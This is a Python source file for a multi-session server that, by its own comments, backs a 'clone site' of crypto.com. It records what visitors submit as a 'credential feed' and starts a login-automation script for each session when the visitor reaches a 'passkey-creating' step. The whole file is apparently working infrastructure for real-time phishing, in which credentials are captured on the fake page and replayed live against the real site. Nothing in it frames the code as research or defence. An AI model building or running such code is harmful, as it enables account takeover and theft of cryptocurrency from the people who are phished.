#!/usr/bin/env python3
"""
Multi-User Session Server for crypto.com automation.
Handles concurrent login sessions with per-session isolation.

Architecture:
  Clone site -> POST /api/step?session=ID & POST /api/submit?session=ID
  Session server reads per-session files
  Python automation runs one instance per active session
"""

import os, sys, json, time, uuid, threading, subprocess, signal
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
DATA_DIR = os.path.join(os.path.dirname(BASE_DIR), "clone-site", "data")

os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(DATA_DIR, exist_ok=True)

active_sessions = {}  # session_id -> {"process": subprocess, "started": timestamp}

def get_session_file(session_id, filename):
    d = os.path.join(SESSIONS_DIR, session_id)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, filename)

class SessionHandler(BaseHTTPRequestHandler):
    def _session_id(self):
        from urllib.parse import urlparse, parse_qs
        q = parse_qs(urlparse(self.path).query)
        sid = q.get("session", [None])[0]
        if not sid:
            # Auto-create session for first request
            sid = str(uuid.uuid4())[:8]
        return sid

    def _send_json(self, data, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def do_GET(self):
        sid = self._session_id()
        if "/api/step" in self.path:
            f = get_session_file(sid, "step.json")
            if os.path.exists(f):
                self._send_json(json.load(open(f, "r")))
            else:
                self._send_json({"step": "login", "session": sid})
        elif "/api/status" in self.path:
            self._send_json({
                "session": sid,
                "active_sessions": len(active_sessions),
                "running": sid in active_sessions
            })
        else:
            self._send_json({"error": "not found"}, 404)

    def do_POST(self):
        sid = self._session_id()
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length)) if length else {}

        if "/api/step" in self.path:
            f = get_session_file(sid, "step.json")
            body["ts"] = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
            body.setdefault("session", sid)
            with open(f, "w") as fp:
                json.dump(body, fp)
            self._send_json({"ok": True, "session": sid})

            # On "passkey-creating": spawn automation if not already running
            if body.get("step") == "passkey-creating" and sid not in active_sessions:
                self._spawn_automation(sid)

        elif "/api/submit" in self.path:
            f = get_session_file(sid, "submissions.jsonl")
            body["id"] = str(uuid.uuid4())
            body["ts"] = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
            with open(f, "a", encoding="utf-8") as fp:
                fp.write(json.dumps(body) + "\n")
            self._send_json({"ok": True, "session": sid})

        elif "/api/start" in self.path:
            # Manual trigger for automation
            self._spawn_automation(sid)
            self._send_json({"ok": True, "session": sid, "started": True})

        else:
            self._send_json({"error": "not found"}, 404)

    def _spawn_automation(self, sid):
        step_file = get_session_file(sid, "step.json")
        feed_file = get_session_file(sid, "submissions.jsonl")

        # Create FRESH browser profile for this session (no cookie reuse)
        profile_dir = os.path.join(SESSIONS_DIR, sid, "profile")
        os.makedirs(profile_dir, exist_ok=True)

        # Write initial state
        with open(step_file, "w") as f:
            json.dump({"step": "login", "session": sid}, f)
        with open(feed_file, "w") as f:
            f.write("")

        # Spawn with session-specific profile
        cfg = json.load(open(os.path.join(BASE_DIR, "config.json"), "r"))
        cfg["credential_feed_path"] = feed_file
        cfg["browser_profile_dir"] = profile_dir
        cfg["session_id"] = sid
        sess_cfg = os.path.join(SESSIONS_DIR, sid, "config.json")
        with open(sess_cfg, "w") as f:
            json.dump(cfg, f)

        log(f"[{sid}] Starting automation...")
        try:
            proc = subprocess.Popen(
                [sys.executable, "login_automation.py", "--auto", "--keep-open",
                 "--session-id", sid,
                 "--feed", feed_file,
                 "--step-file", step_file],
                cwd=BASE_DIR,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )
            active_sessions[sid] = {"process": proc, "started": time.time()}
        except Exception as e:
            log(f"[{sid}] Failed to start: {e}")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)

def cleanup():
    for sid, sess in active_sessions.items():
        try: sess["process"].kill()
        except: pass

def main(port=8760):
    signal.signal(signal.SIGINT, lambda s, f: cleanup() or sys.exit(0))
    server = HTTPServer(("0.0.0.0", port), SessionHandler)
    log(f"Session server running on port {port}")
    log(f"Active sessions: {len(active_sessions)}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        cleanup()
        server.server_close()

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8760
    main(port)
